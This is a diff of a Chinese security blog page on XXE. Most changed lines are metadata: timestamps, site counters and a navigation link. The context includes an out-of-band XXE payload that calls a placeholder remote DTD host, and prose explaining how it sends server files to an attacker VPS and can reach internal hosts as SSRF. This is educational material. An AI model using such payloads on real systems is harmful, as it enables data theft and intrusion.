@@ -148,7 +148,7 @@
 <meta property="og:image" content="https://i.imgur.com/u3U1EPq.png">
 <meta property="og:image" content="https://i.imgur.com/8WMGQfV.gif">
 <meta property="article:published_time" content="2020-05-19T00:08:40.000Z">
-<meta property="article:modified_time" content="2020-05-20T07:41:38.299Z">
+<meta property="article:modified_time" content="2020-05-20T13:08:20.839Z">
 <meta property="article:author" content="yimingy72">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
@@ -622,7 +622,7 @@
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MOJOLICIOUS"><figure class="iseeu highlight /mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip/test.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%remote;%int;%send;</span></span><br><span class="line"><span class="xml">]&gt;</span></span><br></pre></td></tr></table></figure></div>
 
 <p><strong>结果如图：</strong></p>
-<p>环境问题，先不搭了——</p>
+<p>环境问题，先不搭了。。。。。。。</p>
 <p><strong>整个调用过程：</strong></p>
 <p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件（file传入到send的过程中已经执行，传入到send是已经得到的值），然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
 <h4 id="新的思考："><a href="#新的思考：" class="headerlink" title="新的思考："></a>新的思考：</h4><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p>
@@ -798,6 +798,10 @@
 
           <div class="post-nav-prev post-nav-item">
             
+              <a href="/undefined/%E7%8E%B0%E4%BB%A3%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/" rel="prev" title="现代对称加密算法原理">
+                现代对称加密算法原理 <i class="fa fa-chevron-right"></i>
+              </a>
+            
           </div>
         </div>
       
@@ -889,7 +893,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">36</span>
+                  <span class="site-state-item-count">37</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -900,7 +904,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-count">23</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -911,7 +915,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -985,7 +989,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">28k</span>
+    <span title="Site words total count">29.3k</span>
   
 </div>
 <!--
